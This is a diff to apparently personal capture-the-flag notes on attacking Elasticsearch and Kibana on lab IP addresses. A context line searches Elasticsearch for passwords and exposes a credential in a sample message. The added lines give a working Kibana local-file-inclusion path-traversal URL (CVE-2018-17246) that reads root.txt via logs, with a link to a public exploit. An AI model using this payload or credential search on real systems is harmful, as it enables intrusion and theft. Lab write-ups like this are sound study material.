@@ -65,3 +65,14 @@ curl -X GET "10.10.15.175:9200/_search?q=password&pretty"                       
           "receiver" : "wendy",
           "message" : "hey, can you access my dev account for me. My username is l33tperson and my password is 9Qs58Ol3AXkMWLxiEyUyyf"
 ````
+- If there are log files like on port 8000 which are showing you active kabana logs you can have a LFI vulnerability
+- go to the 5601 port and add this extension `/api/console/api_server?sense_version=@@SENSE_VERSION&apis=../../../../../../.../../../../root.txt`
+````
+10.10.156.71:5601/api/console/api_server?sense_version=@@SENSE_VERSION&apis=../../../../../../.../../../../root.txt
+````
+- then curl the logs and grep for root.txt
+````
+curl -s http://10.10.31.117:8000/kibana-log.txt | grep "root.txt" 
+````
+- Also can be used to get a shell in other situations
+- https://github.com/mpgn/CVE-2018-17246
